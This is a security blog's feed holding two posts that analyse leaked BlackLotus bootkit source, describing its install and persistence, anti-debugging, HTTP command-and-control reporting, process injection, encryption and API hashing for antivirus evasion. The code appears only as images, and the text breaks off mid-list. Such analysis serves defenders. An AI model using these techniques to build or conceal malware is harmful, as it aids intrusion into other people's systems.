<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4001/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4001/" rel="alternate" type="text/html" /><updated>2023-08-17T01:46:43+03:00</updated><id>http://localhost:4001/feed.xml</id><title type="html">MSSP Lab</title><subtitle>Cybersecurity, red team, blue team, hacking</subtitle><author><name>MSSP Lab</name></author><entry><title type="html">Malware source code investigation: BlackLotus - part 2</title><link href="http://localhost:4001/threat-hunting/2023/08/16/malware-src-blacklotus-2.html" rel="alternate" type="text/html" title="Malware source code investigation: BlackLotus - part 2" /><published>2023-08-16T01:00:00+03:00</published><updated>2023-08-16T01:00:00+03:00</updated><id>http://localhost:4001/threat-hunting/2023/08/16/malware-src-blacklotus-2</id><content type="html" xml:base="http://localhost:4001/threat-hunting/2023/08/16/malware-src-blacklotus-2.html">&lt;p&gt;BlackLotus is a UEFI bootkit that targets Windows and is capable of evading security software, persisting once it has infected a system, bypassing Secure Boot on fully patched installations of Windows 11, and executing payloads with the highest level of privileges available in the operating system.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/blacklotus.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The source code for the BlackLotus UEFI bootkit has been published on &lt;a href=&quot;https://github.com/ldpreload/BlackLotus&quot;&gt;GitHub&lt;/a&gt; on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;July, 12, 2023&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_12-08.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We are continue our small &lt;a href=&quot;/threat-hunting/2023/07/15/malware-src-blacklotus.html&quot;&gt;research&lt;/a&gt; and today investigate the another modules of &lt;em&gt;BlackLotus&lt;/em&gt; and highlights the main features.&lt;/p&gt;

&lt;h3 id=&quot;bot-logic-install&quot;&gt;Bot logic: Install&lt;/h3&gt;

&lt;p&gt;As we wrote before, a bot in this context refers to a device with the Agent installed.&lt;/p&gt;

&lt;p&gt;First of all, we paid attention to files &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;install.h&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;install.c&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/10/2023-08-16_23-45.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The provided source code appears to be part of a malware installation process. This code is designed to install a bot or malicious payload onto a system and set up persistence. Let’s break down the logic step by step:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GenerateBotFileName(PDWORD Seed)&lt;/code&gt; - This function generates a bot filename based on a given seed using a simple pseudo-random number generator algorithm. It multiplies the seed by a constant value (1664525) to calculate the new seed, which is then returned:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/10/2023-08-16_23-48.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetBotFileName(PDWORD Seed)&lt;/code&gt; - Calls the GenerateBotFileName function to obtain the bot filename seed. Converts the seed to hexadecimal format and constructs the bot filename as a string. Returns the bot filename as a wide string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(LPWSTR)&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/10/2023-08-16_23-49.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetBotDirectory()&lt;/code&gt; - Calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetBotFileName&lt;/code&gt; to get the bot filename. Constructs the bot directory path by concatenating the AppData directory path with the bot filename. Returns the bot directory path as a wide string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(LPWSTR)&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/10/2023-08-16_23-50.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetBotPath()&lt;/code&gt; - Calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetBotFileName&lt;/code&gt; to get the bot filename. Calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetBotDirectory&lt;/code&gt; to get the bot directory path. Constructs the full bot executable path by concatenating the bot directory path, a backslash, the bot filename, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;.exe&quot;&lt;/code&gt;. Returns the full bot executable path as a wide string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(LPWSTR)&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/10/2023-08-16_23-59.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IsSystemInfected()&lt;/code&gt; - Calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetBotPath&lt;/code&gt; to get the bot executable path. Compares the obtained bot executable path with a global variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;g_BotInstallPath&lt;/code&gt;. Returns whether the system is infected (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TRUE&lt;/code&gt;) or not (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FALSE&lt;/code&gt;) based on the comparison:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/10/2023-08-17_00-00.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;InstallBot()&lt;/code&gt; - Calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetBotDirectory&lt;/code&gt; to get the bot directory path. Calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetBotPath&lt;/code&gt; to get the full bot executable path.Converts DOS-style paths to NT-style paths using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DosPathToNtPath&lt;/code&gt; function. Creates the bot directory using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FileCreateDirectory&lt;/code&gt;. Copies the current process executable (malware) to the bot executable path. Sets a global variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;g_BotInstallPath&lt;/code&gt; to the bot executable path. Returns &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TRUE&lt;/code&gt; if installation is successful, otherwise &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FALSE&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/10/2023-08-17_00-01.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UninstallBot()&lt;/code&gt; - This function is incomplete and does not contain the logic for uninstallation.&lt;/p&gt;

&lt;h3 id=&quot;bot-logic-anti-debug&quot;&gt;Bot logic: Anti-debug&lt;/h3&gt;

&lt;p&gt;Next files, are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;antidebug.h&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;antidebug.c&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;The provided source code seems to be focused on anti-debugging techniques, specifically checking whether the current process is being debugged. Also it’s obvious from the file name:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/10/2023-08-17_00-08.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IsBeingDebuggedAlt()&lt;/code&gt; - This function is intended to check whether the current process is being debugged by an external debugger. It retrieves the Process Environment Block (PEB) using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetPeb()&lt;/code&gt; function. It checks the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BeingDebugged&lt;/code&gt; field within the PEB to determine whether the process is being debugged.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IsBeingDebugged()&lt;/code&gt; -  This function is an entry point for checking if the current process is being debugged. It calls the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IsBeingDebuggedAlt()&lt;/code&gt; function to perform the check. If the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IsBeingDebuggedAlt()&lt;/code&gt; function returns &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TRUE&lt;/code&gt;, indicating that the process is being debugged, the function returns an error code &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ERROR_UNSUCCESSFULL&lt;/code&gt;. If the process is not being debugged, the function returns &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NO_ERROR&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This code attempts to detect if the current process is being debugged using an alternative method by examining the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BeingDebugged&lt;/code&gt; field in the Process Environment Block (PEB). Anti-debugging techniques like this are used by malware authors to make it harder for security analysts and researchers to analyze or debug their malicious code.&lt;/p&gt;

&lt;h3 id=&quot;bot-source-code-communication-functionality&quot;&gt;Bot source code: Communication functionality&lt;/h3&gt;

&lt;p&gt;The source code of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http.c&lt;/code&gt; appears to be related to HTTP communication functionality for the BlackLotus bootkit. This code seems to handle &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; connections, sending &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST&lt;/code&gt; requests, and receiving data from a remote server. Let’s break down the code:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HttpConnect(LPSTR UserAgent, LPSTR Host, WORD Port, DWORD Flags)&lt;/code&gt; -  This function establishes an HTTP connection to a specified host. It uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;InternetOpenW&lt;/code&gt; API to create an internet session with the specified user agent. Then, it uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;InternetConnectA&lt;/code&gt; to establish a connection to the specified host on the specified port (port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt; in this case):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/10/2023-08-17_00-54.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HttpRequest(HINTERNET Connect, BOOL bPost, LPSTR URI, LPSTR Referrer, PCHAR Data, DWORD Flags)&lt;/code&gt; -  This function sends an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; request using the established connection. It uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HttpOpenRequestA&lt;/code&gt; to create an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; request to a specified URI. The method used can be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt; depending on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bPost&lt;/code&gt; parameter. It uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HttpSendRequestA&lt;/code&gt; to send the request with the specified headers and data:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/10/2023-08-17_01-00.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HttpReceiveData(HINTERNET Request, PCHAR Buffer)&lt;/code&gt; -  This function receives data from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; response. It uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;InternetReadFile&lt;/code&gt; to read data from the response into a buffer. The function appends the received data to the provided buffer.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/10/2023-08-17_01-01.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HttpPostRequest(PCHAR Host, PCHAR URI, PCHAR Data, PCHAR Response)&lt;/code&gt; -  This function is a higher-level wrapper for making an HTTP &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST&lt;/code&gt; request. It calls HttpConnect to establish an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; connection to the specified host. Then, it calls HttpRequest to send a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST&lt;/code&gt; request with the provided data. After sending the request, it calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HttpReceiveData&lt;/code&gt; to read and store the response data:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/10/2023-08-17_01-02.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Overall, this code appears to facilitate communication between the malware and a remote server through HTTP requests. It’s worth noting that malware often employs HTTP communication to send and receive commands, upload or download files, and exfiltrate data. Analyzing such code requires an understanding of HTTP communication mechanisms and malware analysis techniques.&lt;/p&gt;

&lt;h3 id=&quot;bot-injection-techniques&quot;&gt;Bot: Injection techniques&lt;/h3&gt;

&lt;p&gt;The next file is called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inject.c&lt;/code&gt; and it’s interesting. It’s started from function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetImageBase(LPVOID ProcessAddress)&lt;/code&gt; which is used to retrieve the base address of a module within a process. It iterates backward in memory from the provided &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProcessAddress&lt;/code&gt; to find the base address of the module by locating the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IMAGE_DOS_HEADER&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IMAGE_NT_HEADERS&lt;/code&gt; structures. The function returns the base address of the module:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/10/2023-08-17_01-09.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProcessRelocation(PIMAGE_BASE_RELOCATION Relocation, DWORD ImageBase, DWORD Delta, DWORD Size)&lt;/code&gt; - This function performs relocations for a loaded module within a process:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/10/2023-08-17_01-10.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;InjectData(HANDLE Process, LPVOID Data, DWORD Size)&lt;/code&gt; allocates memory in a remote process and writes data into that memory:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/10/2023-08-17_01-13.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, it uses “classic” combination &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirtualAllocEx&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WriteProcessMemory&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;InjectCode(HANDLE Process, LPVOID Function)&lt;/code&gt; - function injects a code block into a remote process. It obtains the base address and size of the function’s module, creates a file mapping, maps the remote process’ memory, and performs relocations:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/10/2023-08-17_01-15.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It calculates the new address of the injected function and returns it.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;InjectBot(DWORD ProcessId, LPTHREAD_START_ROUTINE Thread)&lt;/code&gt; function injects a thread into a remote process, starting execution at the specified Thread function:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/10/2023-08-17_01-18.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It opens the target process with specific access rights. It calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;InjectCode&lt;/code&gt; to inject the Thread function into the remote process. It creates a remote thread within the target process to execute the injected code.&lt;/p&gt;

&lt;h3 id=&quot;bot-reporting&quot;&gt;Bot: Reporting&lt;/h3&gt;

&lt;p&gt;The provided source code appears to be related to the reporting functionality of the BlackLotus bootkit. This module is responsible for sending periodic reports to command and control (C2) servers about the status and information of the infected system:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/10/2023-08-17_01-20.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProcessServerResponse(CONST PCHAR Response)&lt;/code&gt; function processes the response received from the C2 server after reporting:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/10/2023-08-17_01-39.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ReportThread()&lt;/code&gt; - This function is executed as a thread and handles the periodic reporting to C2 servers. It constructs a report data string using information such as infection type, bot GUID, OS, architecture, and username.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/10/2023-08-17_01-40.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;StartReportThread()&lt;/code&gt; starts the reporting thread by creating a new thread that executes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ReportThread&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/10/2023-08-17_01-42.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;That’s all today. In the next part we will investigate the most interesting part: Bootkit logic.&lt;/p&gt;

&lt;p&gt;We hope this post spreads awareness to the blue teamers of this interesting malware techniques, and adds a weapon to the red teamers arsenal.&lt;/p&gt;

&lt;p&gt;By Cyber Threat Hunters from MSSPLab:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/zhassulan-zhussupov-5a347419b/&quot;&gt;@cocomelonc&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/aruzhan-kaldybek-775735226&quot;&gt;@wqkasper&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;/threat-hunting/2023/07/15/malware-src-blacklotus.html&quot;&gt;Malware source code investigation: BlackLotus - part 1&lt;/a&gt;   &lt;br /&gt;
&lt;a href=&quot;https://github.com/ldpreload/BlackLotus&quot;&gt;https://github.com/ldpreload/BlackLotus&lt;/a&gt;      &lt;br /&gt;
&lt;a href=&quot;https://malpedia.caad.fkie.fraunhofer.de/details/win.blacklotus&quot;&gt;https://malpedia.caad.fkie.fraunhofer.de/details/win.blacklotus&lt;/a&gt;     &lt;br /&gt;
&lt;a href=&quot;https://twitter.com/threatintel/status/1679906101838356480&quot;&gt;https://twitter.com/threatintel/status/1679906101838356480&lt;/a&gt;    &lt;br /&gt;
&lt;a href=&quot;https://twitter.com/TheCyberSecHub/status/1680044350820999168&quot;&gt;https://twitter.com/TheCyberSecHub/status/1680044350820999168&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Thanks for your time happy hacking and good bye!       &lt;br /&gt;
&lt;em&gt;All drawings and screenshots are MSSPLab’s&lt;/em&gt;&lt;/p&gt;</content><author><name>MSSP Lab</name></author><category term="threat-hunting" /><category term="blueteam" /><category term="malware" /><category term="malwareanalysis" /><summary type="html">BlackLotus is a UEFI bootkit that targets Windows and is capable of evading security software, persisting once it has infected a system, bypassing Secure Boot on fully patched installations of Windows 11, and executing payloads with the highest level of privileges available in the operating system.</summary></entry><entry><title type="html">Malware source code investigation: BlackLotus - part 1</title><link href="http://localhost:4001/threat-hunting/2023/07/15/malware-src-blacklotus.html" rel="alternate" type="text/html" title="Malware source code investigation: BlackLotus - part 1" /><published>2023-07-15T05:00:00+03:00</published><updated>2023-07-15T05:00:00+03:00</updated><id>http://localhost:4001/threat-hunting/2023/07/15/malware-src-blacklotus</id><content type="html" xml:base="http://localhost:4001/threat-hunting/2023/07/15/malware-src-blacklotus.html">&lt;p&gt;BlackLotus is a UEFI bootkit that targets Windows and is capable of evading security software, persisting once it has infected a system, bypassing Secure Boot on fully patched installations of Windows 11, and executing payloads with the highest level of privileges available in the operating system.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/blacklotus.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The source code for the BlackLotus UEFI bootkit has been published on &lt;a href=&quot;https://github.com/ldpreload/BlackLotus&quot;&gt;GitHub&lt;/a&gt; on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;July, 12, 2023&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_12-08.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Since at least October 2022, BlackLotus is a UEFI bootkit that has been for sale on hacking forums. The dangerous malware is for sale for &lt;em&gt;$5,000&lt;/em&gt;, with payments of &lt;em&gt;$200&lt;/em&gt; per update.&lt;/p&gt;

&lt;p&gt;In this small research we are detailed investigate the source code of &lt;em&gt;BlackLotus&lt;/em&gt; and highlights the main features.&lt;/p&gt;

&lt;h3 id=&quot;architecture&quot;&gt;Architecture&lt;/h3&gt;

&lt;p&gt;Black Lotus is written in assembly and C and is only &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80kb&lt;/code&gt; in size, the malicious code can be configured to avoid infecting systems in countries in the CIS region (At the time of writing, these countries are Armenia, Azerbaijan, Belarus, Kazakhstan, Kyrgyzstan, Moldova, Russia, Tajikistan and Uzbekistan).&lt;/p&gt;

&lt;p&gt;Source code structure looks like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_12-47_1.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_12-47.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The software consists of two major components: the Agent, which is installed on the target device, and the Web Interface, which is used by administrators to administer bots. A bot in this context refers to a device with the Agent installed.&lt;/p&gt;

&lt;h3 id=&quot;cryptography&quot;&gt;Cryptography&lt;/h3&gt;

&lt;p&gt;First of all, we paid attention to libraries and cryptographic functions:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_13-05.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_13-06.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At first we wanted to focus on the WinAPI hashing method by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CRC32&lt;/code&gt; at malware development. As you can see, nothing out of the ordinary here, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CRC32&lt;/code&gt; implementation with constant &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xEDB88320L&lt;/code&gt;. You can learn more about how to use it for hashing when developing malware, for example, &lt;a href=&quot;https://cocomelonc.github.io/malware/2023/02/02/malware-analysis-7.html&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The implementation of the RC4 algorithm is also standard here, there is nothing complicated about it:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_13-12.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What about XOR? This code appears to implement a custom type of encryption on a given data buffer. The function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CryptXor&lt;/code&gt; is applied to the buffer using the specified Key and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cipher Block Chaining (CBC)&lt;/code&gt; method. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CBC&lt;/code&gt; method is a type of block cipher mode that encrypts plaintext into ciphertext. The encryption of each block depends on the previous block of data:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_13-19.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In summary, this function performs a custom type of encryption on the input buffer. It uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XOR&lt;/code&gt; operations with a given key and CBC chaining, with the possibility to skip over pairs of zero &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DWORD&lt;/code&gt;s.&lt;/p&gt;

&lt;p&gt;And also we have function to decrypt via XOR:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_13-21.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then, the next interesting thing is files like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntdll_hash.h&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kernel32_hash.h&lt;/code&gt;, etc:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_13-25.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Each of which contains hashes of WINAPI functions and DLL names:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_13-25_1.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;av-evasion-tactic&quot;&gt;AV evasion tactic&lt;/h3&gt;

&lt;p&gt;Then, malware author just use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetModuleHandleByHash (DWORD Hash)&lt;/code&gt; function:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_13-44.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The given C function, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetModuleHandleByHash&lt;/code&gt;, is a means of dynamically resolving and obtaining a module handle given a hash of the module name. This is typically seen in malware code, as it helps to avoid static strings (like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;kernel32.dll&quot;&lt;/code&gt;) that could be easily spotted by antivirus heuristic algorithms. This technique increases the difficulty of static analysis.&lt;/p&gt;

&lt;p&gt;The function works as follows:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;It begins by reading the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Thread Environment Block (TEB)&lt;/code&gt; via inline assembly code. This is a structure that Windows maintains per thread to store thread-specific information. The structure of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TEB&lt;/code&gt; and the offsets used indicate that it’s retrieving the first entry in the InLoadOrderModuleList, which is a doubly linked list of loaded modules in the order they were loaded. This is a common way to get a list of loaded modules without calling any APIs like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EnumProcessModules&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Once it has the first module, it enters a loop where it processes each module in turn. For each module, it converts the module name to lower case and computes its &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CRC32&lt;/code&gt; hash (using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Crc32Hash&lt;/code&gt; function).&lt;/p&gt;
  &lt;/li&gt;
